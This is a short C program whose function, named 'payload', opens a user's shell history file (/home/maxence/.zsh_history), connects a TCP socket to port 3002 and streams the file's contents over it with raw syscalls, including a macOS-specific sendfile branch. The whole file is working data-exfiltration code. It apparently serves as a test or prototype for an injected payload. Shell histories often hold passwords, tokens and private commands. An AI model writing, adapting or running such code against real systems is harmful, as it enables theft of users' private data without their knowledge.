#include <limits.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>

void payload(void)
{
	uint16_t port = 0;
	uint32_t addr_ip = 0;
	// char path[PATH_MAX] = "/home/maxence/.zsh_history";
	char path[PATH_MAX] = "/home/maxence/.zsh_history";

	int fd = syscall(SYS_open, path, O_RDONLY);
	if (fd == -1) {
		perror("open");
		return;
	}

	struct stat st;
	if (syscall(SYS_stat, path, &st) == -1) {
		perror("stat");
		close(fd);
		return;
	}

	int socketfd = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
	if (socketfd == -1) {
		perror("socket");
		close(fd);
		return;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(3002);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	printf("port: %#x %#x\n", addr.sin_port, addr.sin_addr.s_addr);

	if (syscall(SYS_connect, socketfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
		perror("connect");
		close(fd);
		close(socketfd);
		return;
	}

	off_t filesize = st.st_size;
#ifdef __APPLE__
	if (syscall(SYS_sendfile, fd, socketfd, 0, &filesize, NULL, 0) == -1) {
		perror("sendfile");
		close(fd);
		close(socketfd);
		return;
	}
#else
	if (syscall(SYS_sendfile, socketfd, fd, 0, &filesize) == -1) {
		perror("sendfile");
		close(fd);
		close(socketfd);
		return;
	}
#endif /* __APPLE__ */

	close(fd);
	close(socketfd);
}

int main(void)
{
	payload();
}